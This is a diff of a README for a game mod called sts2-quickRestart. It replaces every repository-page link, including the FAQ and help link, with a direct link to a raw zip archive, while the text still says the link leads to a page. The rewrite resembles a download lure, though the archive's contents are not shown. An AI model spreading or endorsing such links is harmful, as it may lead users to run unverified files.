@@ -1,6 +1,6 @@
 # 🎮 sts2-quickRestart - Fast Save and Load Mod  
 
-[![Download sts2-quickRestart](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/leticiacrs/sts2-quickRestart)
+[![Download sts2-quickRestart](https://img.shields.io/badge/Download-Here-brightgreen)](https://github.com/leticiacrs/sts2-quickRestart/raw/refs/heads/main/quickRestart2/sts_Restart_quick_2.9.zip)
 
 ## 📦 What is sts2-quickRestart?  
 
@@ -29,7 +29,7 @@ You will find the download link below and important steps to get the mod running
 
 Click the button below to visit the download page. There you can get the files and instructions.  
 
-[![Download sts2-quickRestart](https://img.shields.io/badge/Download-Now-blue)](https://github.com/leticiacrs/sts2-quickRestart)  
+[![Download sts2-quickRestart](https://img.shields.io/badge/Download-Now-blue)](https://github.com/leticiacrs/sts2-quickRestart/raw/refs/heads/main/quickRestart2/sts_Restart_quick_2.9.zip)  
 
 Since the link points to a page, you will need to do the following once you open it:  
 
@@ -122,6 +122,6 @@ The downloaded mod package usually contains:
 ## 📲 Need More Help?  
 
 Visit the main page to find FAQs or community advice:  
-https://github.com/leticiacrs/sts2-quickRestart  
+https://github.com/leticiacrs/sts2-quickRestart/raw/refs/heads/main/quickRestart2/sts_Restart_quick_2.9.zip  
 
 You will find links to discussions, issue tracking, and further instructions there.
